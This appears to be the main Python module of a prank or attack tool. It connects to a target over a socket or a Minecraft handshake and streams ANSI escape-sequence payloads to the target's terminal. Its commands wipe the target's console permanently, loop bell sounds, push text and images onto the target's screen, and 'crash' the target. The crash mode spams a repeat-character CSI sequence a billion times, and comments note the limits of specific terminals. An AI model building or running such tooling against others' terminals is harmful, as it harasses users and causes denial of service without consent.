import sys
import threading
import time
from typing import List

import PIL
import PIL.ImageSequence
# our own modules
import formatting
import imagedisplay
import printer
import payload
from formatting import RED, RESET, CYAN, BLUE

running = True
current_payload = payload.Payload() # the default payload does nothing

# keep ticking the current payload
def payload_thread(printer: printer.Printer):
    global running, current_payload

    while running:
        current_payload.tick(printer)
    
    printer.close()

# gets the printer specified by the user
def get_printer() -> printer.Printer | None:
    if len(sys.argv) < 2:
        return None
    
    mode = sys.argv[1]
    if mode == "netcat" or mode == "nc" or mode == "socket" or mode == "sock":
        if len(sys.argv) != 4: return None
        host = sys.argv[2]
        try: 
            port = int(sys.argv[3])
        except:
            print("ERROR: port must be a number")
            return None
        
        # connect to the server and return this printer
        try:
            p = printer.SocketPrinter((host, port))
            return p
        except Exception as e:
            print("Error while setting up socket printer: %s" % str(e))
    
    elif mode == "mc" or mode == "handshake":
        if len(sys.argv) != 4: return None
        host = sys.argv[2]
        try: 
            port = int(sys.argv[3])
        except:
            print("ERROR: port must be a number")
            return None
        
        # connect to the server and return this printer
        try:
            p = printer.McHandshakePrinter((host, port))
            return p
        except Exception as e:
            print("Error while setting up minecraft handshake printer: %s" % str(e))
    
    elif mode == "self":
        return printer.SelfPrinter()
    
    else:
        return None

def handle_command(command: str, stack: list[tuple[str, int]] = []):
    global running, current_payload

    if command == "help":
        # i hate python with its bytes
        print(f"{RED.decode()}Commands:{RESET.decode()}")
        print(f"{RED.decode()}- {CYAN.decode()}help {BLUE.decode()}: {CYAN.decode()}Shows the help for all the commands, you already figured this one out :D{RESET.decode()}")
        print(f"{RED.decode()}- {CYAN.decode()}stop {BLUE.decode()}: {CYAN.decode()}Stops the currently running payload{RESET.decode()}")
        print(f"{RED.decode()}- {CYAN.decode()}exit {BLUE.decode()}: {CYAN.decode()}Stops the currently running payload and exits the program{RESET.decode()}")
        print(f"{RED.decode()}- {CYAN.decode()}reset {BLUE.decode()}: {CYAN.decode()}Tries to recover the console from all the previous shenanigans{RESET.decode()}")
        print(f"{RED.decode()}- {CYAN.decode()}wipe [permanent] {BLUE.decode()}: {CYAN.decode()}Wipes the console and all the previous content on it, if permanent is selected it will keep wiping the console{RESET.decode()}")
        print(f"{RED.decode()}- {CYAN.decode()}bell [loop <delay>] {BLUE.decode()}: {CYAN.decode()}Plays an annoying bell sound if the terminal supports it, optionally loops every <delay> milliseconds{RESET.decode()}")
        print(f"{RED.decode()}- {CYAN.decode()}text [OPTIONS] <text> {BLUE.decode()}: {CYAN.decode()}Displays some text to the console{RESET.decode()}")
        print(f"  {BLUE.decode()}Options: --figlet_font, --clean_mode, --repeat, --rgb_mode{RESET.decode()}")
        print(f"{RED.decode()}- {CYAN.decode()}file <file {BLUE.decode()}: {CYAN.decode()}Uploads the raw file to the target, great for sharing big text files{RESET.decode()}")
        print(f"{RED.decode()}- {CYAN.decode()}img [OPTIONS] <file> {BLUE.decode()}: {CYAN.decode()}Displays an image to the targets screen.{RESET.decode()}")
        print(f"  {BLUE.decode()}Options: --mode (required), --clean_mode, --delay, --width/--height (to specify the dimensions, tries to preserve aspect ratio){RESET.decode()}")
        print(f"{RED.decode()}- {CYAN.decode()}crash <mode> {BLUE.decode()}: {CYAN.decode()}Attempts to crash the target{RESET.decode()}")
        print(f"  {BLUE.decode()}Modes: repeat, (TODO: add more){RESET.decode()}")
        print(f"{RED.decode()}- {CYAN.decode()}script <file> {BLUE.decode()}: {CYAN.decode()}Runs all the commands in the specified file{RESET.decode()}")
        print(f"{RED.decode()}- {CYAN.decode()}wait [timeout_ms] {BLUE.decode()}: {CYAN.decode()}Waits until the currently running payload is done, or the timeout was exceeded (great for scripting){RESET.decode()}")
        
    elif command == "exit":
        print("Shutting down...")
        running = False
    
    elif command == "reset":
        reset_sequence = formatting.EXIT_INVISIBLE_MODE + formatting.OSC8_LINK_END + formatting.RESET
        current_payload = payload.RawPayload(reset_sequence)
    
    elif command == "stop":
        current_payload = payload.Payload() # the default paylaod does nothing

    elif command.startswith("wipe"):
        if command == "wipe":
            delay = None
        elif command == "wipe permanent":
            delay = 0 # this will give no delay
        else:
            return "Incorrect usage"

        current_payload = payload.RawPayload(formatting.RESET_CONSOLE, delay=delay)
    
    elif command == "bell" or command.startswith("bell "):
        split = command.split(" ")
        if len(split) == 1:
            delay = None
        elif split[1] == "loop" and len(split) == 3:
            try:
                delay = int(split[2])
            except:
                return "the bell delay must be a number!"
        else:
            return "Incorrect usage"
        
        current_payload = payload.RawPayload(formatting.BELL, delay=delay)

    elif command.startswith("text "):
        command = command[len("text "):].strip()
        i = 0

        # parse arguments
        error_message = None
        allow_color = True
        font = None
        repeat = 0
        clean = None
        rgb = None
        band_size = 0
        while i < len(command) and command[i:].strip().startswith("--"):
            i += command[i:].find("--") + 2
            end = command[i:].find(" ")
            if end == -1: 
                return "Please specify some text, not only arguments"

            arg = command[i:i+end]
            split = arg.split('=')
            if len(split) != 2:
                error_message = "all arguments need to be in the format --key=value"
                break
            
            if split[0] == "figlet_font":
                if split[1].lower() == 'none':
                    font = None
                else:
                    font = split[1].lower()
            elif split[0] == "repeat":
                try:
                    repeat = int(split[1])
                except:
                    error_message = "the repeat delay should be a whole number"
                    break
            elif split[0] == "clean_mode":
                if split[1].lower() == "none":
                    clean = None
                else:
                    clean = split[1].lower()
            elif split[0] == "rgb_mode":
                allow_color = False # we are going to override the color, we don't want to allow colors in the text since they will be messed up
                if split[1].lower() == "none":
                    rgb = None
                else:
                    rgb = split[1].lower()
            elif split[0] == "gradient_size":
                try:
                    band_size = int(split[1])
                except:
                    error_message = "the RGB gradient size should be a whole number"
                    break
            else:
                error_message = "unknown key '" + split[0] + "'"
                break

            i += end + 1
        
        # handle errors during parsing
        if error_message != None:
            return "Error while parsing arguments: " + error_message
        elif band_size == 0 and rgb == "gradient":
            return "the gradient needs a band size, specified by --gradient_size"
        elif band_size != 0 and rgb != "gradient":
            return "the --band_size needs to be used in combination with --rgb_mode=gradient"

        # format the text
        try:
            formatted = formatting.parse_text(command[i:].strip(), font=font, allow_color=allow_color)
        except Exception as e:
            return "Error while parsing text: " + e.args[0]

        current_payload = payload.TextDisplay(formatted, repeat_every=repeat, clean_mode=clean, rgb_mode=rgb, band_size=band_size)

    elif command.startswith("file "):
        file = command.removeprefix("file ")
        try:
            with open(file) as f:
                data = f.read()
        except FileNotFoundError:
            return "file does not exist"
        
        current_payload = payload.TextDisplay(data.encode())

    elif command.startswith("img "):
        split = command.split(" ")

        i = 1
        error_message = None
        mode = None
        width = None
        height = None
        delay = None
        clean_mode = None
        while True:
            if i >= len(split):
                return "you also need the file path dummy"

            if split[i].strip() == "": 
                i += 1
                return
            elif not split[i].startswith("--"):
                break

            arg = split[i][2:]
            argsplit = arg.split("=")
            if len(argsplit) != 2:
                error_message = "all arguments must be in the form --abc=def"
                break

            if argsplit[0] == "mode":
                mode = argsplit[1]
            elif argsplit[0] == "width":
                try:
                    width = int(argsplit[1])
                except:
                    error_message = "the width must be an int!"
            elif argsplit[0] == "height":
                try:
                    height = int(argsplit[1])
                except:
                    error_message = "the height must be an int!"
            elif argsplit[0] == "delay":
                try:
                    delay = int(argsplit[1])
                except:
                    error_message = "the delay must be an int!"
            elif argsplit[0] == "clean_mode":
                if argsplit[1] == "none":
                    clean_mode = None
                else:
                    clean_mode = argsplit[1]
            else:
                error_message = "unknown argument"
                break
            
            i += 1


        if error_message != None:
            return error_message

        if width == None and height == None:
            print("You didn't specify a width or height, expect the image to be larger than you initially thought")
        elif width != None and height != None:
            print("Both width and height were given, expect the aspect ratio to be changed")

        if mode == "braille":
            display = imagedisplay.BrailleDisplay(width, height)
        elif mode == "ascii":
            display = imagedisplay.AsciiDisplay(width, height)
        else:
            return "Unknown image mode"

        try:
            # this is the most time-intensive task: reading the images from disk. since we aren't in control over this we can't do shit about it
            images = imagedisplay.read_images(" ".join(split[i:]))
        except Exception as e:
            return str(e)
        
        current_payload = payload.ImagePayload(display, images, delay=delay, clean_mode=clean_mode)

    elif command.startswith("script "):
        path = command.removeprefix("script ")

        if any(x for (x, _) in stack if x==path):
            return f"Recursive scripts detected! tried to execute {path}"
        
        with open(path, 'r') as f:
            lines = f.readlines()
        
        for i in range(len(lines)):
            line = lines[i].strip()
            error = handle_command(line, stack=stack + [(path, i)])
            if error != None:
                return error + "\n at " + path + " line " + str(i+1) + ": " + line

    elif command == "wait" or command.startswith("wait "):
        split = command.split(" ")
        if len(split) == 1:
            max_duration = None
        elif len(split) == 2:
            try:
                max_duration = int(split[1])
            except:
                return "the duration msut be a number!"
        else:
            return "Incorrect usage"
        
        start = time.time() * 1000
        # loop until the current payload is done or we timed out
        while not current_payload.is_done():
            if max_duration != None and time.time()*1000 - start > max_duration:
                break # timed out

    elif command.startswith("echo "):
        print(command.removeprefix("echo "))
    
    elif command.startswith("crash "):
        split = command.split()

        if split[1] == "repeat":
            # uses the "repeat previous grapthics character" CSI sequence to spam 1 billion emojis
            # widnows terminal limits to 65536, vscode to 32767
            sequence = '✌'.encode() + formatting.repreat_char(1000000000)
            current_payload = payload.RawPayload(sequence)

        else:
            return "Unknown crash mode!"

    elif command == "": pass

    else:
        return "Unknown command '%s'" % command

def main():
    global running, current_payload
    
    p = get_printer()

    if p == None:
        print("Usage: %s <printer> [options]" % sys.argv[0])
        print("Available printers:")
        print("- socket <host> <port> : plain old socket connection (aliases: sock, nc, netcat)")
        print("- self : prints to your own console, only for testing new payloads")
        return

    run_thread = threading.Thread(target=payload_thread, args=(p,))
    run_thread.daemon = True
    run_thread.start()

    try:
        while running:
            # execute command
            command = input(f"{RED.decode()}ANSI{CYAN.decode()}> {RESET.decode()}")
            error = handle_command(command)
            if error != None:
                print("[ERROR]", error, "\n at the execution of", command)
        
        run_thread.join()

    except KeyboardInterrupt:
        print("Control-C detected, shutting down")
        running = False
        run_thread.join()
    except Exception as err:
        print(err)
        running = False
        run_thread.join()
        raise err

main()